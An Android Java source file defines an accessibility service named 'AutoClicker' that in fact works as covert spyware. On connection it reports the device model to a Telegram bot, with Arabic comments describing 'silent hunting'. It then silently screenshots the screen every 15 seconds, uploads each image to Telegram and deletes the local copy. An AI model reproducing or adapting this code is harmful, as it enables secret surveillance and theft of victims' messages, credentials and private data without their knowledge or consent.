package com.tom5.monitor;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;
import java.io.FileOutputStream;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class AutoClicker extends AccessibilityService {
    private Handler handler = new Handler(Looper.getMainLooper());
    private Executor executor = Executors.newSingleThreadExecutor();

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        TelegramSender.sendMessage("✅ الخدمة اشتغلت على جهاز: " + android.os.Build.MODEL + "\nجاري بدء الصيد الصامت..");
        
        // حلقة التصوير (سكرين شوت كل 15 ثانية)
        startCapturingLoop();
    }

    private void startCapturingLoop() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                captureNow();
                handler.postDelayed(this, 15000); 
            }
        }, 5000);
    }

    private void captureNow() {
        // ميزة أندرويد 11+ للسكرين شوت الصامت
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(0, executor, new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult result) {
                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(result.getHardwareBuffer(), result.getColorSpace());
                    if (bitmap != null) saveAndUpload(bitmap);
                }
                @Override public void onFailure(int errorCode) {}
            });
        } else {
            // أندرويد 9 و 10 يحتاج MediaProjection (البث) حصراً لأخذ سكرين شوت
            TelegramSender.sendMessage("⚠️ هذا الجهاز (أندرويد 10 أو أقل) يحتاج نسخة البث لتصوير الشاشة.");
        }
    }

    private void saveAndUpload(Bitmap b) {
        executor.execute(() -> {
            try {
                // 1. حفظ في ملف مؤقت داخل الكاش
                File file = new File(getCacheDir(), "temp.jpg");
                try (FileOutputStream out = new FileOutputStream(file)) {
                    b.compress(Bitmap.CompressFormat.JPEG, 40, out);
                    // 2. الرفع لتيليجرام
                    TelegramSender.sendPhoto(file);
                    // 3. الحذف الفوري
                    file.delete();
                }
                b.recycle();
            } catch (Exception ignored) {}
        });
    }

    @Override public void onAccessibilityEvent(AccessibilityEvent event) {}
    @Override public void onInterrupt() {}
}
